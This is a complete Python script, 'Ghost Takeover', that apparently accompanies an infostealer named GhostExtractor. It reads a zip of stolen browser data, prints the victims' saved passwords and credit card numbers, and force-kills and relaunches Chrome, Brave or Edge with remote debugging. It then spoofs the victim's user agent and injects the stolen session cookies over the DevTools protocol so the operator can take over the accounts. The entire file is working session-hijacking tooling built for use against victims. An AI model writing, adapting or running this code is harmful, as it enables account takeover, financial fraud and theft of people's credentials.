import json
import sys
import time
import os
import subprocess
import zipfile
import websocket
import requests as req


BROWSERS = {
    'chrome': {
        'paths': [
            os.path.join(os.getenv('PROGRAMFILES', ''), 'Google', 'Chrome', 'Application', 'chrome.exe'),
            os.path.join(os.getenv('PROGRAMFILES(X86)', ''), 'Google', 'Chrome', 'Application', 'chrome.exe'),
            os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome', 'Application', 'chrome.exe'),
        ],
        'user_data': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data'),
        'process': 'chrome.exe',
    },
    'brave': {
        'paths': [
            os.path.join(os.getenv('PROGRAMFILES', ''), 'BraveSoftware', 'Brave-Browser', 'Application', 'brave.exe'),
            os.path.join(os.getenv('PROGRAMFILES(X86)', ''), 'BraveSoftware', 'Brave-Browser', 'Application', 'brave.exe'),
            os.path.join(os.getenv('LOCALAPPDATA', ''), 'BraveSoftware', 'Brave-Browser', 'Application', 'brave.exe'),
        ],
        'user_data': os.path.join(os.getenv('LOCALAPPDATA', ''), 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'process': 'brave.exe',
    },
    'edge': {
        'paths': [
            os.path.join(os.getenv('PROGRAMFILES', ''), 'Microsoft', 'Edge', 'Application', 'msedge.exe'),
            os.path.join(os.getenv('PROGRAMFILES(X86)', ''), 'Microsoft', 'Edge', 'Application', 'msedge.exe'),
        ],
        'user_data': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data'),
        'process': 'msedge.exe',
    },
}


def find_installed():
    """Return list of browsers that are actually installed."""
    installed = []
    for name, cfg in BROWSERS.items():
        for path in cfg['paths']:
            if os.path.exists(path):
                installed.append(name)
                break
    return installed


def ask_browser():
    """Ask user which browser to use for import."""
    installed = find_installed()

    if not installed:
        print("\n  [!] No supported browser found (chrome, brave, edge)")
        sys.exit(1)

    print("\n  Available browsers:")
    for i, name in enumerate(installed, 1):
        print(f"    {i}. {name}")

    while True:
        try:
            choice = input(f"\n  Choose browser [1-{len(installed)}]: ").strip()
            idx = int(choice) - 1
            if 0 <= idx < len(installed):
                return installed[idx]
        except (ValueError, EOFError, KeyboardInterrupt):
            pass
        print("  Invalid choice, try again")


def load_zip(zip_path):
    """Load all cookies and user agents from a GhostExtractor zip."""
    cookies = []
    passwords = []
    cards = []
    wallets = {}
    user_agents = {}

    with zipfile.ZipFile(zip_path, 'r') as zf:
        for entry in zf.namelist():
            try:
                raw = zf.read(entry).decode('utf-8', errors='ignore')

                if entry.endswith('cookies.json'):
                    cookies.extend(json.loads(raw))
                elif entry.endswith('passwords.json'):
                    passwords.extend(json.loads(raw))
                elif entry.endswith('credit_cards.json'):
                    cards.extend(json.loads(raw))
                elif entry.endswith('wallets.json'):
                    wallets.update(json.loads(raw))
                elif entry == 'user_agents.json':
                    user_agents = json.loads(raw)
            except Exception:
                continue

    return cookies, passwords, cards, wallets, user_agents


def kill_browser(browser):
    """Kill browser process."""
    proc = BROWSERS[browser]['process']
    os.system(f'taskkill /F /IM {proc} >nul 2>&1')
    time.sleep(2)


def launch_browser(browser, profile, port):
    """Launch browser with remote debugging."""
    binary = None
    for path in BROWSERS[browser]['paths']:
        if os.path.exists(path):
            binary = path
            break

    if not binary:
        return False

    user_data = BROWSERS[browser]['user_data']
    cmd = [
        binary,
        f'--remote-debugging-port={port}',
        f'--user-data-dir={user_data}',
        f'--profile-directory={profile}',
        '--remote-allow-origins=*',
        '--no-first-run',
        '--no-default-browser-check',
        'about:blank',
    ]

    subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    for _ in range(30):
        try:
            r = req.get(f'http://127.0.0.1:{port}/json', timeout=1)
            if r.status_code == 200:
                return True
        except Exception:
            pass
        time.sleep(0.5)

    return False


def connect_cdp(port):
    """Connect to CDP WebSocket."""
    targets = req.get(f'http://127.0.0.1:{port}/json').json()
    page = next((t for t in targets if t.get('type') == 'page'), targets[0])
    return websocket.create_connection(page['webSocketDebuggerUrl'], timeout=10)


def cdp_send(ws, method, params=None, cmd_id=1):
    """Send CDP command and wait for response."""
    msg = {'id': cmd_id, 'method': method}
    if params:
        msg['params'] = params
    ws.send(json.dumps(msg))
    while True:
        resp = json.loads(ws.recv())
        if resp.get('id') == cmd_id:
            return resp
        time.sleep(0.01)


def inject_cookie(ws, cookie, cmd_id):
    """Inject a single cookie via CDP."""
    domain = cookie.get('domain', '')
    name = cookie.get('name', '')
    value = cookie.get('value', '')

    if not name or not value or not domain:
        return False

    samesite = str(cookie.get('sameSite', 'Lax')).lower()
    ss_map = {
        'no_restriction': 'None', 'none': 'None',
        'lax': 'Lax', 'strict': 'Strict', 'unspecified': 'Lax',
    }
    ss = ss_map.get(samesite, 'Lax')
    secure = cookie.get('secure', False)
    if ss == 'None':
        secure = True

    scheme = 'https' if secure else 'http'
    clean = domain.lstrip('.')

    params = {
        'name': name, 'value': value, 'domain': domain,
        'path': cookie.get('path', '/'),
        'secure': secure, 'httpOnly': cookie.get('httpOnly', False),
        'sameSite': ss, 'url': f'{scheme}://{clean}/',
    }

    expires = cookie.get('expirationDate', 0)
    if expires and expires > 0:
        params['expires'] = float(expires)

    resp = cdp_send(ws, 'Network.setCookie', params, cmd_id=cmd_id)
    return resp.get('result', {}).get('success', False)


def main():
    print()
    print("  ╔══════════════════════════════════════════╗")
    print("  ║     👻  G H O S T   T A K E O V E R     ║")
    print("  ╚══════════════════════════════════════════╝")

    if len(sys.argv) < 2:
        print("\n  Usage: python takeover.py <data.zip> [browser] [profile]")
        print("\n  If browser is not specified, you'll be asked to choose.")
        print("  Cookies from ANY source browser work in ANY target browser.")
        sys.exit(1)

    source = sys.argv[1]

    if not os.path.exists(source):
        print(f"\n  [!] File not found: {source}")
        sys.exit(1)

    browser = sys.argv[2] if len(sys.argv) > 2 else None
    profile = sys.argv[3] if len(sys.argv) > 3 else 'Default'
    port = 9222

    if not browser:
        browser = ask_browser()

    if browser not in BROWSERS:
        print(f"\n  [!] Unknown browser: {browser}")
        print(f"  Supported: {', '.join(BROWSERS.keys())}")
        sys.exit(1)

    print(f"\n  Source:  {source}")
    print(f"  Browser: {browser}")
    print(f"  Profile: {profile}")

    print(f"\n  [*] Loading data from zip...")
    cookies, passwords, cards, wallets, user_agents = load_zip(source)

    print(f"  [+] {len(cookies)} cookies")
    print(f"  [+] {len(passwords)} passwords")
    print(f"  [+] {len(cards)} credit cards")
    print(f"  [+] {len(wallets)} wallet vaults")

    if passwords:
        print(f"\n  ── PASSWORDS ──────────────────────────────")
        for pw in passwords:
            url = pw.get('url', '')
            domain = url.split('/')[2] if len(url.split('/')) > 2 else url
            print(f"  {domain}")
            print(f"    user: {pw.get('username', '')}")
            print(f"    pass: {pw.get('password', '')}")
        print()

    if cards:
        print(f"  ── CREDIT CARDS ──────────────────────────")
        for card in cards:
            print(f"  {card.get('number', 'N/A')} | {card.get('name', 'N/A')} | {card.get('month', '?')}/{card.get('year', '?')}")
        print()

    if wallets:
        print(f"  ── WALLETS ───────────────────────────────")
        for wname in wallets:
            print(f"  {wname}: vault extracted (encrypted)")
        print()

    if not cookies:
        print("\n  [!] No cookies to inject")
        sys.exit(1)

    print(f"  [*] Killing {browser}...")
    kill_browser(browser)

    print(f"  [*] Launching {browser} with debugging...")
    if not launch_browser(browser, profile, port):
        print(f"  [!] Failed to launch {browser}")
        sys.exit(1)

    print(f"  [*] Connecting to CDP...")
    try:
        ws = connect_cdp(port)
    except Exception as e:
        print(f"  [!] CDP failed: {e}")
        sys.exit(1)

    cdp_send(ws, 'Network.enable')

    victim_ua = None
    for key in user_agents:
        if any(b in key for b in [browser, 'chrome']):
            victim_ua = user_agents[key]
            break
    if not victim_ua and user_agents:
        victim_ua = next(iter(user_agents.values()))

    if victim_ua:
        cdp_send(ws, 'Network.setUserAgentOverride', {
            'userAgent': victim_ua,
            'acceptLanguage': 'en-US,en;q=0.9',
            'platform': 'Win32',
        })
        print(f"  [+] UA spoofed")

    print(f"  [*] Injecting {len(cookies)} cookies...")
    ok = 0
    fail = 0
    for i, cookie in enumerate(cookies):
        if inject_cookie(ws, cookie, cmd_id=1000 + i):
            ok += 1
        else:
            fail += 1

    print(f"  [+] Imported: {ok}")
    if fail:
        print(f"  [!] Failed:   {fail}")

    print(f"\n  ╔══════════════════════════════════════════╗")
    print(f"  ║              ✅  DONE                    ║")
    print(f"  ║  Cookies: {ok:<6} UA: {'spoofed' if victim_ua else 'default':<10}    ║")
    print(f"  ║  Browser is open. Check your sessions.   ║")
    print(f"  ╚══════════════════════════════════════════╝")

    try:
        ws.close()
    except Exception:
        pass


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n  [*] Interrupted")